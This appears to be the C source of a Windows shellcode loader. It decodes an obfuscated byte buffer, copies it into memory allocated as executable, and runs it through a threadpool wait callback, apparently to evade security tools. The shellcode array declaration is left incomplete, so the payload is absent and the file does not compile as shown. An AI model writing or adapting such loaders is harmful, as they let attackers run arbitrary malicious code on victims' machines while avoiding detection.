#include "code.h"
#include "lazy_importer.hpp"
#include "winuser.h"

void* MMcpy(void* dst, const void* src, size_t len)
{
	char* ch_dst = (char*)dst;
	char* ch_src = (char*)src;
	if (NULL == ch_dst || NULL == ch_src) {
		return NULL;
	}

	void* rest = ch_dst;

	if (ch_dst <= ch_src || (char*)ch_dst >= (char*)ch_src + len) {
		while (len--) {
			*(char*)ch_dst = *(char*)ch_src;
			ch_dst = (char*)ch_dst + 1;
			ch_src = (char*)ch_src + 1;
		}
	}
	else {
		ch_src = (char*)ch_src + len - 1;
		ch_dst = (char*)ch_dst + len - 1;
		while (len--) {
			*(char*)ch_dst = *(char*)ch_src;
			ch_dst = (char*)ch_dst - 1;
			ch_src = (char*)ch_src - 1;
		}
	}
	return rest;
}
void start()
{
	//char shellcode[DATA_SIZE] = {};
	char shellcode
	DWORD size = ((PDWORD)shellcode)[0];//size
	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
	char* shellcodeAddress =(char*)(VirtualAlloc)(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	char* tmpptr = shellcode + sizeof(DWORD);
	for (int i = 0; i < size; i++)
	{
		tmpptr[i] = (tmpptr[i] - 1) ^ (i + 1);
		//tmpptr[i] = tmpptr[i];
	}
	MMcpy(shellcodeAddress, tmpptr, sizeof(shellcode));
	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
	SetThreadpoolWait(threadPoolWait, event, NULL);
	WaitForSingleObject(event, INFINITE);
	while (1)
	{
		Sleep(12000);
	}
	//return 0;
}